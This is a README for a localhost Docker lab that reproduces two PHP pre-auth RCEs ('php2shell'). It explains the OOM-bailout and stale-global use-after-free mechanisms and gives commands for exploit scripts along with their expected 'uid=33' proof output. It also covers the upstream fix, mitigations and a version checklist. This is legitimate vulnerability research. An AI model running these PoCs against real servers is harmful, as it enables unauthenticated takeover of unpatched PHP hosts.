# php2shell lab — CVE-2026-109618 / CVE-2026-109619

> **AUTHORIZED USE ONLY.** This repository contains working exploit code for
> two critical PHP RCEs. Every service in the lab binds to `127.0.0.1`.
> Use it only on systems you own or are explicitly authorized to test.
> See [SECURITY.md](SECURITY.md).

Local reproduction lab for the two critical PHP core RCEs disclosed on
2026-10-21 ("php2shell"). Everything runs on `127.0.0.1` inside Docker.

## What the bugs are

| CVE | Mechanism | Confirmed impact here |
|---|---|---|
| CVE-2026-109618 | OOM uses `longjmp()`/`zend_bailout()`, which can leave partially initialized request memory behind; request shutdown then reads/branches on it. | Full unauthenticated RCE on Apache mod_php (PHP 8.4.26). |
| CVE-2026-109619 | Worker-global state (session, error, `BG(unserialize)`, ...) can point into a previous request's freed heap; the next request consumes it before normal initialization. | Stale `BG(unserialize)` consumed by the rfc1867 upload-progress handler on PHP-FPM 8.4.26 (worker SIGSEGV / 502). Full mod_php chain also uses this class. |

Fixed in **8.2.35, 8.3.36, 8.4.27, 8.5.12**. PHP 8.1 and older are EOL.

## Lab topology

| Service | Image | Port | Purpose |
|---|---|---|---|
| `vuln-modphp` | `php:8.4.26-apache` (pinned digest) | 8088 | vulnerable mod_php |
| `fixed-modphp` | `php:8.4.27-apache` (pinned digest) | 8089 | patched control |
| `vuln-fpm` | `php:8.4.26-fpm` | via nginx | vulnerable FPM |
| `nginx-vuln` | `nginx:1.27-alpine` | 8090 | FPM frontend |
| `fixed-fpm` | `php:8.4.27-fpm` | via nginx | patched control |
| `nginx-fixed` | `nginx:1.27-alpine` | 8091 | FPM frontend |

The mod_php images are pinned to the digests the build profile was measured
against.

## Run

```bash
cd lab
docker compose up -d
```

Verify:

```bash
curl http://127.0.0.1:8088/   # OK  (PHP 8.4.26)
curl http://127.0.0.1:8089/   # OK  (PHP 8.4.27)
curl http://127.0.0.1:8090/   # OK  (PHP 8.4.26 FPM)
curl http://127.0.0.1:8091/   # OK  (PHP 8.4.27 FPM)
```

## PoCs

### mod_php — full RCE (CVE-2026-109619 class)

```bash
python3 poc/exploit.py -u http://127.0.0.1:8088/index.php --proof lab/out/p
```

Expected:

```
[+] Zend MM chunk base = 0x...
[+] libphp base = 0x...
[*] stage 3: carrier=0x... zif_system=0x...
[+] executed on attempt 1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The page is just `<?php echo "OK\n"; ?>`; it never calls `session_start()`.
The producer OOMs inside PHP's pre-RINIT upload-progress session init, the
consumer reclaims the freed `zend_reference` and forges a HashTable whose
`pDestructor` is `zif_system`.

Negative control:

```bash
python3 poc/exploit.py -u http://127.0.0.1:8089/index.php --proof lab/out-fixed/p
# [-] heap leak failed
```

### FPM — stale `BG(unserialize)` UAF

```bash
python3 poc/fpm_chain_e.py --port 8090 --proof lab/out-fpm/p
# producer: OOM during session decode
# consumer: HTTP/1.1 502 Bad Gateway   <-- worker SIGSEGV

python3 poc/fpm_chain_e.py --port 8091 --container php2shell-lab-fixed-fpm-1 --proof lab/out-fpm-fixed/p
# consumer: HTTP/1.1 200 OK            <-- patched, no crash
```

The producer decodes a ~28 MB session that starts with an `Evil` object and
then a large string; the OOM abandons `PHP_VAR_UNSERIALIZE_DESTROY` and leaves
`BG(unserialize)` pointing at request memory. The consumer's rfc1867 handler
runs before normal RINIT and destroys the stale var_hash. On 8.4.26 this
crashes the worker (SIGSEGV); on 8.4.27 the early reset prevents it.

Full FPM RCE needs a controlled heap layout/gadget so `__destruct` runs before
the crash. `lab/src/preload.php` preloads an `Evil` gadget via
`opcache.preload` for that experiment; the verified result in this lab is the
UAF/crash primitive, not code execution.

### Other helpers

```bash
python3 poc/fpm_trigger.py --port 8090 --runs 1 --monitor   # upload_progress armed
python3 poc/fpm_probe.py --port 8090                        # read session file during stall
```

## The official fix

Commit `3584a98bda0f` / `506e87fa7dcd` ("Avoid state corruption via bailout"):

- OOM no longer uses `longjmp()`; it is a delayed soft OOM at the next VM safe
  point, plus a hard `_exit()` at a second, higher threshold.
- Hash operations gained fallible variants; array init avoids the large key
  allocation; the superglobal destructor sets zvals to `UNDEF`; request
  shutdown clears `modules_activated`.
- Request globals (`PG(http_globals)`, last error, `BG()`/`EG()` state) are
  reset before operations that run ahead of normal request initialization.
- Session globals are reset at `MULTIPART_EVENT_START`, upload-progress decode
  runs in `in_rfc1867_update` mode without user callbacks, and `$_SESSION` is
  removed before the target script runs.

## Mitigations (until patched)

- Update to 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12. This is the only complete fix.
- `memory_limit=-1` administratively (removes the controllable OOM; not
  complete if `mmap()` fails). Never use `RLIMIT_AS`/`RLIMIT_DATA`.
- `session.upload_progress.enabled=0` (session lifecycle path).
- PHP 8.5: `fatal_error_backtraces=0`.
- Keep `post_max_size` conservative and enforce a decoded-body limit at the
  frontend; bound multipart parts, headers, nesting and uploads.
- `pm.max_requests=1` reduces exposure by retiring workers.
- WAF rules help but do not fix a runtime memory-safety bug.

## Impact checklist for your own code

```bash
php -v
php -r 'echo PHP_SAPI, PHP_EOL;'
php -r 'echo ini_get("session.upload_progress.enabled"), PHP_EOL;'
php -r 'echo ini_get("memory_limit"), PHP_EOL;'
```

- Any PHP < 8.2.35/8.3.36/8.4.27/8.5.12 serving HTTP is affected; frameworks
  (WordPress, Laravel, Drupal, Magento, ...) do not matter, only the runtime.
- mod_php is the highest-risk SAPI (pre-auth, before application code).
- PHP-FPM/php-cgi/FrankenPHP/LiteSpeed are affected too; exploitability varies.
- Check Docker base images, shared hosting, CI images and pinned `php:` tags.
- PHP 8.1 and older will not get an official fix; upgrade.

## Credits

- The `libphp.so` symbol offsets (`zif_system`, `zval_ptr_dtor`) were read
  directly from the pinned image with `nm`/`objdump`; the heap calibration
  values were measured against that same build.
- Credit for the public analysis and the original research goes to the PHP
  security team, the reporters listed in the advisories, and the authors of
  the public write-ups (PHP Foundation, Akamai, Wiz, Cloudflare, and the
  public PoC authors).

## Disclaimer

Local, isolated lab for authorized security research. Do not point the PoCs at
systems you do not own or have permission to test. See [SECURITY.md](SECURITY.md).
